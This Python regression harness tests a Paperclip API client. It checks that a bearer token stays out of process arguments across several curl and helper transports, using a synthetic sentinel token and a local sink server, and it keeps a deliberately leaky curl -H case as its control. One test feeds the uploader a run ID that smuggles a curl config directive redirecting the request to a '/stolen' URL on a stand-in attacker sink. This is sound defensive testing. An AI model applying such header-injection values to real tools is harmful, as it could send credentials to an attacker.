#!/usr/bin/env python3
"""Regression: a Paperclip credential must never appear in process arguments.

On Linux ``/proc/<pid>/cmdline`` is world-readable (0444), so any transport that
passes the bearer token as a command-line argument publishes it to every process
on the host for the lifetime of the call. This harness proves, per transport,
that the credential stays out of argv *and* that the request still carries the
header.

Two independent channels are measured for every transport:

  leak channel      every ``/proc/<pid>/cmdline`` on the host plus a full
                    ``ps -ww -eo pid,args`` snapshot, sampled while the request
                    is held open by a local sink server.
  delivery channel  the sink records the raw request bytes, so a transport that
                    simply forgets to send the header cannot pass as "clean".

A transport passes only when it is CLEAN on the leak channel and DELIVERED on
the delivery channel.

Case A is the pattern this repository used to document (``curl -H
"Authorization: Bearer $KEY"``) and is the positive control: it MUST leak. If it
ever comes back clean, the detector is broken and the whole run is void.

The credential used against the sink is a synthetic sentinel, never a real
token, so the harness itself cannot leak anything.

    python3 argv-leak-regression.py                       # sink cases only
    python3 argv-leak-regression.py --live                # + real GET
    python3 argv-leak-regression.py --live-mutation ISSUE  # + real PATCH & audit control
"""
from __future__ import annotations

import argparse
import json
import os
import socket
import subprocess
import sys
import threading
import time
import uuid

HERE = os.path.dirname(os.path.abspath(__file__))
SH_HELPER = os.path.join(HERE, "paperclip-api.sh")
PY_HELPER = os.path.join(HERE, "paperclip-api.py")
UPLOAD_HELPER = os.path.join(HERE, "paperclip-upload-artifact.sh")
SENTINEL = "SENTINEL." + uuid.uuid4().hex + ".NOTAREALJWT"
RUN_ID = "regression-run-id"


class Sink:
    """Accepts a connection, records the request, holds it open for sampling."""

    def __init__(self, hold_s: float = 2.5):
        self.hold_s = hold_s
        self.sock = socket.socket()
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(("127.0.0.1", 0))
        self.sock.listen(8)
        self.port = self.sock.getsockname()[1]
        self.received = b""
        self.requests = []
        self.connected = threading.Event()
        threading.Thread(target=self._serve, daemon=True).start()

    def _serve(self):
        while True:
            try:
                conn, _ = self.sock.accept()
            except OSError:
                return
            with conn:
                request_bytes = b""
                # Keep reading for the whole hold window: a multipart upload
                # arrives in several segments (curl may also wait out its own
                # `Expect: 100-continue`), and the body must be seen before the
                # delivery channel can be judged.
                conn.settimeout(0.25)
                deadline = time.time() + self.hold_s
                while time.time() < deadline:
                    try:
                        chunk = conn.recv(65535)
                    except socket.timeout:
                        continue
                    except OSError:
                        break
                    if not chunk:
                        break
                    self.received += chunk
                    request_bytes += chunk
                    self.connected.set()
                self.requests.append(request_bytes)
                request_line = request_bytes.split(b"\r\n", 1)[0]
                if b"/attachments " in request_line and request_line.startswith(b"GET "):
                    body = b"[]"
                elif b"/attachments " in request_line and request_line.startswith(b"POST "):
                    body = (b'{"id":"attachment-1","contentPath":"/api/attachments/attachment-1/content",'
                            b'"downloadPath":"/api/attachments/attachment-1/content?download=1",'
                            b'"byteSize":18}')
                else:
                    body = b"{}"
                try:
                    conn.sendall(b'HTTP/1.1 200 OK\r\nContent-Length: ' + str(len(body)).encode()
                                 + b'\r\n\r\n' + body)
                except OSError:
                    pass

    def reset(self):
        self.received = b""
        self.requests = []
        self.connected.clear()

    @property
    def api_url(self):
        return "http://127.0.0.1:%d/api" % self.port

    def close(self):
        try:
            self.sock.close()
        except OSError:
            pass


def scan_host_for(needle: str) -> dict:
    """Look for `needle` the way a neighbouring process would."""
    in_cmdline = False
    for entry in os.listdir("/proc"):
        if not entry.isdigit():
            continue
        try:
            with open("/proc/%s/cmdline" % entry, "rb") as fh:
                if needle.encode() in fh.read():
                    in_cmdline = True
                    break
        except OSError:
            continue
    ps_out = subprocess.run(["ps", "-ww", "-eo", "pid,args"],
                            capture_output=True, text=True).stdout
    return {"in_proc_cmdline": in_cmdline, "in_ps_output": needle in ps_out}


def run_case(case: dict, sink: Sink, scratch: str) -> dict:
    sink.reset()
    env = dict(
        os.environ,
        PAPERCLIP_API_KEY=SENTINEL,
        PAPERCLIP_API_URL=sink.api_url,
        PAPERCLIP_RUN_ID=RUN_ID,
        PAPERCLIP_RUN_SCRATCH_DIR=scratch,
        PAPERCLIP_HELPER_STATE_DIR=os.path.join(scratch, "uploader-locks"),
        PAPERCLIP_COMPANY_ID="c",
        PAPERCLIP_TASK_ID="x",
        UPLOAD_HELPER=UPLOAD_HELPER,
        UPLOAD_FILE=os.path.join(scratch, "regression-upload.txt"),
        SINK_URL=sink.api_url + "/agents/me",
    )
    env["PAPERCLIP_RUN_ID"] = case.get("run_id", RUN_ID)
    proc = subprocess.Popen(["bash", "-c", case["script"]], env=env,
                            stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True)
    sink.connected.wait(timeout=15)
    time.sleep(0.3)                      # let the request settle in the table
    scan = scan_host_for(SENTINEL)
    _, err = proc.communicate(timeout=90)
    got = sink.received.decode("utf-8", "replace")
    leaked = scan["in_proc_cmdline"] or scan["in_ps_output"]
    delivered = ("Bearer " + SENTINEL) in got
    run_id_ok = ("X-Paperclip-Run-Id: " + env["PAPERCLIP_RUN_ID"]) in got if case.get("expect_run_id") else True
    body_ok = case["expect_body"] in got if case.get("expect_body") else True
    request_count_ok = len(sink.requests) == case["expect_request_count"] if case.get("expect_request_count") else True
    ok = (leaked == case["expect_leak"]) and delivered and run_id_ok and body_ok and request_count_ok
    return {
        "case": case["id"],
        "transport": case["label"],
        "credential_in_proc_cmdline": scan["in_proc_cmdline"],
        "credential_in_ps_output": scan["in_ps_output"],
        "auth_header_delivered": delivered,
        "run_id_header_delivered": run_id_ok,
        "payload_delivered": body_ok,
        "request_count": len(sink.requests),
        "expected_leak": case["expect_leak"],
        "verdict": ("RED (leak reproduced -- detector control)" if case["expect_leak"] and leaked
                    else "GREEN" if ok else "FAIL"),
        "ok": ok,
        "stderr": (err or "").strip()[:200],
    }


def run_rejected_uploader_case(scratch: str, variant: str) -> dict:
    target = Sink(0.25)
    attacker = Sink(0.25)
    try:
        run_id = {
            "curl_directive": 'run"\nurl = "' + attacker.api_url + '/stolen',
            "carriage_return": "run\rid",
            "line_feed": "run\nid",
            "tab": "run\tid",
        }[variant]
        env = dict(
            os.environ,
            PAPERCLIP_API_KEY=SENTINEL,
            PAPERCLIP_API_URL=target.api_url,
            PAPERCLIP_RUN_ID=run_id,
            PAPERCLIP_RUN_SCRATCH_DIR=scratch,
            PAPERCLIP_HELPER_STATE_DIR=os.path.join(scratch, "uploader-locks"),
            PAPERCLIP_COMPANY_ID="c",
            PAPERCLIP_TASK_ID="x",
        )
        proc = subprocess.run(
            ["bash", UPLOAD_HELPER, os.path.join(scratch, "regression-upload.txt"),
             "--no-work-product", "--output", "json"],
            env=env, capture_output=True, text=True, timeout=15,
        )
        ok = (proc.returncode != 0 and not target.requests and not attacker.requests
              and not target.connected.is_set() and not attacker.connected.is_set()
              and "PAPERCLIP_RUN_ID contains a control character" in proc.stderr
              and SENTINEL not in proc.stderr)
        return {
            "case": "uploader_reject_" + variant,
            "target_requests": len(target.requests),
            "attacker_requests": len(attacker.requests),
            "verdict": "GREEN" if ok else "FAIL",
            "ok": ok,
        }
    finally:
        target.close()
        attacker.close()


def build_cases(scratch: str) -> list:
    body = os.path.join(scratch, "regression-body.json")
    with open(body, "w") as fh:
        fh.write('{"body":"argv regression probe"}')
    upload = os.path.join(scratch, "regression-upload.txt")
    with open(upload, "w") as fh:
        fh.write("regression-payload")

    return [
        {
            "id": "A",
            "label": 'curl -H "Authorization: Bearer $KEY" (the pattern this fix removes)',
            "script": 'curl -s --max-time 20 -H "Authorization: Bearer $PAPERCLIP_API_KEY" "$SINK_URL"',
            "expect_leak": True,
        },
        {
            "id": "B",
            "label": "curl --config - fed by the shell builtin printf",
            "script": ('printf \'header = "Authorization: Bearer %s"\\nurl = "%s"\\n'
                       'silent\\nmax-time = 20\\n\' "$PAPERCLIP_API_KEY" "$SINK_URL" '
                       '| curl --config -'),
            "expect_leak": False,
        },
        {
            "id": "C",
            "label": "scripts/paperclip-api.sh :: pc_api GET",
            "script": '. "%s"; pc_api GET /api/agents/me' % SH_HELPER,
            "expect_leak": False,
            "expect_run_id": True,
        },
        {
            "id": "D",
            "label": "scripts/paperclip-api.sh :: pc_api POST with body",
            "script": '. "%s"; pc_api POST /api/issues/x/comments "%s"' % (SH_HELPER, body),
            "expect_leak": False,
            "expect_run_id": True,
            "expect_body": "argv regression probe",
        },
        {
            "id": "E",
            "label": "scripts/paperclip-api.sh :: pc_api_upload (multipart)",
            "script": '. "%s"; pc_api_upload /api/issues/x/attachments "%s" text/plain'
                      % (SH_HELPER, upload),
            "expect_leak": False,
            "expect_run_id": True,
            "expect_body": "regression-payload",
        },
        {
            "id": "F",
            "label": "scripts/paperclip-api.py :: GET",
            "script": 'python3 "%s" GET /api/agents/me' % PY_HELPER,
            "expect_leak": False,
            "expect_run_id": True,
        },
        {
            "id": "G",
            "label": "artifact uploader with a normal run id",
            "script": 'bash "$UPLOAD_HELPER" "$UPLOAD_FILE" --no-work-product --output json',
            "expect_leak": False,
            "expect_run_id": True,
            "expect_body": "regression-payload",
            "expect_request_count": 2,
        },
        {
            "id": "H",
            "label": "artifact uploader with quote and backslash in run id",
            "script": 'bash "$UPLOAD_HELPER" "$UPLOAD_FILE" --no-work-product --output json',
            "run_id": RUN_ID + '"\\quoted',
            "expect_leak": False,
            "expect_run_id": True,
            "expect_body": "regression-payload",
            "expect_request_count": 2,
        },
    ]


def live_checks(issue_id: str | None) -> dict:
    """Real API through the shipped python client, observed from the outside."""
    out = {}
    proc = subprocess.Popen([sys.executable, PY_HELPER, "GET", "/api/agents/me"],
                            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
    deadline = time.time() + 8
    raw = b""
    while time.time() < deadline and not raw:
        try:
            with open("/proc/%d/cmdline" % proc.pid, "rb") as fh:
                raw = fh.read()
        except OSError:
            break
        time.sleep(0.01)
    scan = scan_host_for(os.environ["PAPERCLIP_API_KEY"])
    stdout, _ = proc.communicate(timeout=120)
    out["get_status"] = (stdout or "").strip().split("\n")[0]
    out["client_argv"] = [p.decode() for p in raw.split(b"\x00") if p]
    out["real_credential_in_proc_cmdline"] = scan["in_proc_cmdline"]
    out["real_credential_in_ps_output"] = scan["in_ps_output"]
    out["ok"] = (out["get_status"] == "200"
                 and not scan["in_proc_cmdline"] and not scan["in_ps_output"])

    if issue_id:
        scratch = os.environ.get("PAPERCLIP_RUN_SCRATCH_DIR", "/tmp")
        body = os.path.join(scratch, "regression-patch.json")
        with open(body, "w") as fh:
            json.dump({"status": os.environ.get("PC_REGRESSION_STATUS", "in_progress")}, fh)
        res = subprocess.run([sys.executable, PY_HELPER, "PATCH", "/api/issues/" + issue_id,
                              "@" + body], capture_output=True, text=True, timeout=150)
        out["patch_status"] = (res.stdout or "").strip().split("\n")[0]
        # audit control: the same call with a foreign run id must be refused
        env = dict(os.environ, PAPERCLIP_RUN_ID="00000000-0000-4000-8000-000000000000")
        res = subprocess.run([sys.executable, PY_HELPER, "PATCH", "/api/issues/" + issue_id,
                              "@" + body], capture_output=True, text=True, timeout=150, env=env)
        out["patch_foreign_run_id_status"] = (res.stdout or "").strip().split("\n")[0]
        out["ok"] = (out["ok"] and out["patch_status"] == "200"
                     and out["patch_foreign_run_id_status"] not in ("200", ""))
    return out


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--live", action="store_true", help="also run a real GET against the API")
    ap.add_argument("--live-mutation", metavar="ISSUE_ID",
                    help="also run a real PATCH on this issue plus the audit control")
    ap.add_argument("--json", metavar="PATH", help="write the report to PATH")
    args = ap.parse_args()

    scratch = os.environ.get("PAPERCLIP_RUN_SCRATCH_DIR") or os.environ.get("TMPDIR") or "/tmp"
    sink = Sink()
    report = {
        "started_utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "sentinel_shape": "SENTINEL.<32 hex>.NOTAREALJWT (synthetic, never a live token)",
        "cases": [],
    }
    try:
        for case in build_cases(scratch):
            report["cases"].append(run_case(case, sink, scratch))
        for variant in ("curl_directive", "carriage_return", "line_feed", "tab"):
            report["cases"].append(run_rejected_uploader_case(scratch, variant))
    finally:
        sink.close()

    control = next(c for c in report["cases"] if c["case"] == "A")
    report["detector_control_ok"] = control["credential_in_proc_cmdline"]
    report["all_ok"] = report["detector_control_ok"] and all(c["ok"] for c in report["cases"])

    if args.live or args.live_mutation:
        report["live"] = live_checks(args.live_mutation)
        report["all_ok"] = report["all_ok"] and report["live"]["ok"]

    text = json.dumps(report, indent=2)
    print(text)
    if args.json:
        with open(args.json, "w") as fh:
            fh.write(text)
    return 0 if report["all_ok"] else 1


if __name__ == "__main__":
    sys.exit(main())
